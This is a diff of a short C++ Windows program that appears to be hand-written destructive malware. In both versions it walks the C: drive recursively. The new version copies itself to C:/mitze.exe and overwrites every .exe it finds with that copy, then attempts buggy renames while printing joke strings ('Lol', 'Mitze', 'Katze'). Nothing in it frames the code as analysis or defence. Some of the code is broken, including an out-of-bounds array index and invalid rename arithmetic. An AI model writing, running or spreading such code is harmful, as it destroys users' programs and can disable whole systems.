@@ -1,34 +1,70 @@
-#include <iostream>
-#include <string>
-#include <array>
-#include <cstdlib>
-#include <unistd.h>
 #include <windows.h>
-#include <fstream>
-#include <filesystem>
-#include <Windows.h>
+#include <string>
+#include <iostream>
+#include <array>
 using namespace std;
 string sWords[] = {"Lol","Mitze","Katze"};
 string Chain = "";
-const std::filesystem::directory_options options = (
-    std::filesystem::directory_options::skip_permission_denied
-);
 
-void printer()
+void FckFiles(std::string directory, std::string fileFilter, bool recursively = true)
 {
-	std::string path = "C:/";
-	for (const auto & entry : std::filesystem::recursive_directory_iterator(path,std::filesystem::directory_options(options))){
-			try {
-				Chain = Chain + sWords[rand() % 4];
-				cout << Chain;
-				CopyFile("./a.exe",entry.path().string().c_str(),0);
-			}
-			catch (const std::exception& e){
+  if (recursively)
+    FckFiles(directory, fileFilter, false);
 
-			}
-	}	
+  directory += "\\";
+
+  WIN32_FIND_DATA FindFileData;
+  HANDLE hFind = INVALID_HANDLE_VALUE;
+
+  std::string filter = directory + (recursively ? "*" : fileFilter);
+
+  hFind = FindFirstFile(filter.c_str(), &FindFileData);
+
+  if (hFind == INVALID_HANDLE_VALUE)
+  {
+    return;
+  }
+  else
+  {
+    if (!recursively)
+    {
+		Chain = Chain + sWords[rand() % 4];
+		cout << Chain;
+    	string Chickfila = directory + std::string(FindFileData.cFileName);
+		CopyFile("C:/mitze.exe",Chickfila.c_str(),0);
+  		rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
+    }
+
+    while (FindNextFile(hFind, &FindFileData) != 0)
+    {
+      if (!recursively)
+      {
+		Chain = Chain + sWords[rand() % 4];
+		cout << Chain;
+        string Chickfila = directory + std::string(FindFileData.cFileName);
+        CopyFile("C:/mitze.exe",Chickfila.c_str(),0);
+  		rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
+      }
+      else
+      {
+        if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)>0 && FindFileData.cFileName[0]!='.')
+        {
+          FckFiles(directory + std::string(FindFileData.cFileName), fileFilter);
+        }
+      }
+    }
+
+    DWORD dwError = GetLastError();
+    FindClose(hFind);
+    if (dwError != ERROR_NO_MORE_FILES)
+    {
+      std::cout << "FindNextFile error. Error is "<< dwError << std::endl;
+    }
+  }
 }
-int main()
+
+int main(int argc, char* argv[])
 {
-	printer();
+	CopyFile("./a.exe","C:/mitze.exe",0);
+	FckFiles("C:/", "*.exe");
 }
